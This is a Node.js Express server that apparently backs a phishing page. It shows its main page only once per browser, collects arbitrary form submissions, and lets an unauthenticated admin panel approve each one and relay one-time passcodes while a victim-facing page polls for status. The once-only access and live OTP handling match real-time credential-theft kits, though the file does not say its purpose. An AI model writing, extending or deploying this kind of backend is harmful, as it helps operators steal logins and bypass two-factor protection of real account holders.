// 1. Import the necessary packages
const express = require("express");
const cors = require("cors");
const path = require("path");
const crypto = require("crypto");
const cookieParser = require("cookie-parser"); // We need this to manage cookies

// 2. Create the server application
const app = express();
const PORT = process.env.PORT || 3000;
app.set('trust proxy', 1);

// --- NEW COOKIE-BASED SYSTEM ---

// This Set will store the unique IDs of browsers that have visited.
const visitedIDs = new Set();
const COOKIE_NAME = 'session_pass';

// This is our new cookie-checking middleware
const oneTimeAccess = (req, res, next) => {
    // These paths are always allowed
    const allowedPaths = [
        '/admin.html',
        '/submit',
        '/submission',
        '/update-status',
        '/archive'
    ];
    
    if (allowedPaths.some(p => req.path.startsWith(p)) || req.path.startsWith('/get-status/')) {
        return next();
    }
    
    // Check if the user's browser sent our cookie
    const passID = req.cookies[COOKIE_NAME];

    // If they have a cookie and its ID has been used, block them.
    if (passID && visitedIDs.has(passID)) {
        return res.status(403).send(`
            <div style="font-family: sans-serif; text-align: center; padding: 50px;">
                <h1>Access Denied</h1>
                <p>This page was for one-time use only.</p>
            </div>
        `);
    }
    
    // Allow the request to continue
    next();
};

// 3. Apply middleware
app.use(cookieParser()); // Use the cookie parser middleware
app.use(cors());
app.use(express.json());
app.use(oneTimeAccess); // Use our custom one-time access middleware

// 4. Serve all static files like CSS, images, etc.
app.use(express.static(path.join(__dirname)));

// 5. Handle the main page visit
app.get("/", (req, res) => {
    // For a first-time visitor, create a new pass
    const passID = crypto.randomBytes(16).toString('hex');
    visitedIDs.add(passID); // Immediately add it to the list to block future visits

    // Send the pass to the user's browser as a cookie that expires in 1 year
    res.cookie(COOKIE_NAME, passID, {
        httpOnly: true, // Prevents browser JavaScript from accessing it
        secure: true,   // Only send over HTTPS
        sameSite: 'strict',
        maxAge: 31536000000 // 1 year in milliseconds
    });

    // Send them the main page
    res.sendFile(path.join(__dirname, "index.html"));
});

// --- END OF NEW SYSTEM ---

// 6. Create an "in-memory" database that holds a LIST of submissions
let submissions = [];

// 7. Endpoint for receiving user data
app.post("/submit", (req, res) => {
    console.log("Received a new submission!");
    const newSubmission = req.body;
    newSubmission.id = Date.now().toString();
    newSubmission.status = "pending";
    newSubmission.timestamp = new Date().toLocaleString("en-US", { timeZone: "Asia/Kolkata" });
    submissions.push(newSubmission);
    res.status(200).json({
        message: "Submission received.",
        submissionId: newSubmission.id,
    });
});

// 8. Endpoint for the admin panel to get ALL PENDING submissions
app.get("/submission", (req, res) => {
    const pendingSubmissions = submissions.filter(
        (s) => s.status === "pending",
    );
    res.status(200).json(pendingSubmissions);
});

// 9. Endpoint for updating the status (from admin) OR adding/clearing the OTP
app.post("/update-status", (req, res) => {
    const { id, status, otp } = req.body;
    const submission = submissions.find((s) => s.id === id);

    if (submission) {
        if (status) {
            submission.status = status;
            console.log(`Submission ${id} status updated to: ${status}`);
        }
        if (otp) {
            submission.otp = otp;
            console.log(`Submission ${id} received OTP: ${otp}`);
        } else if (otp === null) {
            submission.otp = null;
            console.log(`Submission ${id} OTP cleared.`);
        }
        res.status(200).json({ message: `Submission ${id} updated.` });
    } else {
        res.status(404).json({ message: "Submission not found." });
    }
});

// 10. Endpoint for the OTP page to CHECK the status of a SPECIFIC submission
app.get("/get-status/:id", (req, res) => {
    const { id } = req.params;
    const submission = submissions.find((s) => s.id === id);
    if (submission) {
        res.status(200).json({ status: submission.status });
    } else {
        res.status(404).json({ message: "Submission not found." });
    }
});

// 11. Endpoint for the admin to get the ARCHIVE
app.get("/archive", (req, res) => {
    const archivedSubmissions = submissions
        .filter((s) => s.status !== "pending")
        .reverse();
    res.status(200).json(archivedSubmissions);
});

// 12. Start the server
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
